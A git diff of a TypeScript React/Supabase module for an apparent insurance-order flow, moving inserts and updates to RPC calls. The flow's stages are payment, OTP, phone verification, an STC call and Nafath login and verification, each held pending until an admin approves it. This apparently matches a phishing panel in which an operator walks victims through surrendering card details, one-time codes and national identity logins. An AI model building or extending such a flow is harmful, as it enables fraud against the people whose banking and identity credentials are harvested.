@@ -1,28 +1,8 @@
 import { useState, useEffect } from "react";
 import { supabase } from "@/integrations/supabase/client";
-import { ensureVisitorSessionHeader } from "@/lib/supabaseHeaders";
 
 type Stage = "payment" | "otp" | "phone_verification" | "phone_otp" | "stc_call" | "nafath_login" | "nafath_verify";
 type StageStatus = "pending" | "approved" | "rejected";
-
-const insertStageEvent = async (
-  orderId: string,
-  stage: Stage,
-  status: StageStatus,
-  visitorSessionId: string | null,
-  payload?: Record<string, any>
-) => {
-  ensureVisitorSessionHeader();
-  await (supabase as any)
-    .from("insurance_order_stage_events")
-    .insert({
-      order_id: orderId,
-      stage,
-      status,
-      visitor_session_id: visitorSessionId,
-      payload: payload ?? {},
-    });
-};
 
 export const useAdminApproval = (orderId: string | null, stage: Stage) => {
   const [status, setStatus] = useState<"waiting" | "approved" | "rejected">("waiting");
@@ -50,8 +30,8 @@ export const useAdminApproval = (orderId: string | null, stage: Stage) => {
       )
       .subscribe();
 
-    // Also poll every 3s as fallback
     const interval = setInterval(async () => {
+      // Use RPC to read order status securely
       const { data } = await supabase
         .from("insurance_orders")
         .select("stage_status, current_stage")
@@ -78,34 +58,42 @@ export const createOrUpdateStage = async (
   extraData?: Record<string, any>
 ): Promise<string | null> => {
   const visitorSid = typeof sessionStorage !== "undefined" ? sessionStorage.getItem("visitor_sid") : null;
-  const payload: Record<string, any> = {
+  
+  const stageData: Record<string, any> = {
     current_stage: stage,
     stage_status: "pending",
     ...extraData,
   };
-  if (visitorSid) payload.visitor_session_id = visitorSid;
 
   let resolvedOrderId = orderId;
 
   if (orderId) {
-    const { error } = await supabase
-      .from("insurance_orders")
-      .update(payload)
-      .eq("id", orderId);
+    // Use RPC for secure update
+    const { data, error } = await supabase.rpc("upsert_insurance_order", {
+      p_visitor_session_id: visitorSid || "",
+      p_order_id: orderId,
+      p_data: stageData,
+    });
     if (error) throw error;
   } else {
-    const { data, error } = await supabase
-      .from("insurance_orders")
-      .insert({ status: "pending", ...payload })
-      .select("id")
-      .single();
+    // Use RPC for secure insert
+    const { data, error } = await supabase.rpc("upsert_insurance_order", {
+      p_visitor_session_id: visitorSid || "",
+      p_data: { status: "pending", ...stageData },
+    });
     if (error) throw error;
-    resolvedOrderId = data?.id || null;
+    resolvedOrderId = data as string | null;
   }
 
-  if (resolvedOrderId) {
+  if (resolvedOrderId && visitorSid) {
     try {
-      await insertStageEvent(resolvedOrderId, stage, "pending", visitorSid, extraData);
+      await supabase.rpc("insert_stage_event", {
+        p_visitor_session_id: visitorSid,
+        p_order_id: resolvedOrderId,
+        p_stage: stage,
+        p_status: "pending",
+        p_payload: extraData ?? {},
+      });
     } catch (error) {
       console.error("Failed to persist stage event", error);
     }
